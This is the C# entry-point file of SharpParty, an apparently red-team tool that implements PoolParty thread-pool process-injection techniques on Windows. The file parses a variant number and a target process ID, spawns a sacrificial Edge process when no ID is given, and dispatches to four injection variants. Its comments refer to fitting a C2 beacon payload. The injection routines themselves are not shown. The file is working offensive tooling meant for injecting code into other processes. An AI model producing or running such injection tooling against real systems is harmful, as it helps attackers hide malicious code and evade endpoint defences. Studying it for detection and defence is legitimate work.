﻿/**
* BSD 3-Clause License

* Copyright (c) 2023-2024, SafeBreach Labs
* Copyright (c) 2025, Stroz Friedberg
* All rights reserved.

* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
* 1. Redistributions of source code must retain the above copyright notice, this
*    list of conditions and the following disclaimer.
* 2. Redistributions in binary form must reproduce the above copyright notice,
*    this list of conditions and the following disclaimer in the documentation
*    and/or other materials provided with the distribution.
* 3. Neither the name of the copyright holder nor the names of its
*    contributors may be used to endorse or promote products derived from
*    this software without specific prior written permission.

* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
using System;
using static SharpParty.HelperFuncs;
using static SharpParty.Win32;

namespace SharpParty
{
    internal class Program
    {

        static void Usage()
        {
            Console.WriteLine("[-] ERROR - Unrecognized Arguments.");
            Console.WriteLine("[*] USAGE: ./SharpParty.exe <variant> <pid>");
            Console.WriteLine("--- <variant> (required): Integer value representing the PoolParty variant to run (1, 4, 6, 7)");
            Console.WriteLine("--- <pid> (optional): Integer value representing the target process ID (if no value is specified, a sacrificial edge process will be created for the injection)");
            Console.WriteLine("[*] Example: ./SharpParty.exe 4 666");
            System.Environment.Exit(1);
        }
        
        static void Main(string[] args)
        {
            int variant = 0;
            int targetPid = 0;
            bool parsedVariant = false;
            bool parsedPid = false;
            if (args.Length == 1)
            {
                parsedVariant = int.TryParse(args[0], out variant);
            } else if (args.Length == 2)
            {
                parsedVariant = int.TryParse(args[0], out variant);
                parsedPid = int.TryParse(args[1], out targetPid);
            } else
            {
                Usage();
            }

            if (parsedVariant && !parsedPid)
            {
                string[] cands = ValidateCandidates();
                if (cands.Length == 0)
                {
                    Console.WriteLine("[-] ERROR - Failed to find a valid candidate for injection. PoolParty Failed!");
                    return;
                }
                targetPid = CreateTargetProcess(PickCandidate(cands));
                Sleep(1000); // Sleep for 1s, need some time between process creation and injection
            }

            IntPtr tProcHandle = GetHandleForProc(targetPid);

            switch (variant)
            {
                case 1: // Variant 1 - OverwriteStartRoutine (can't write sc that's too big; i.e. C2 beacon)
                    OverwriteStartRoutine.Run(tProcHandle);
                    break;
                case 4: // Variant 4 - RemoteTpIoInsertion (crashes injected proc on exit; get one callback as expected)
                    RemoteTpIoInsertion.Run(tProcHandle);
                    break;
                case 6: // Variant 6 - RemoteTpJobInsertion (crashes injected proc on exit; gets two callbacks?)
                    RemoteTpJobInsertion.Run(tProcHandle);
                    break;
                case 7: // Variant 7 - RemoteTpDirectInsertion (seems to only work once per-reboot)
                    RemoteTpDirectInsertion.Run(tProcHandle);
                    break;
                default:
                    Usage();
                    break;
            }
        }
    }
}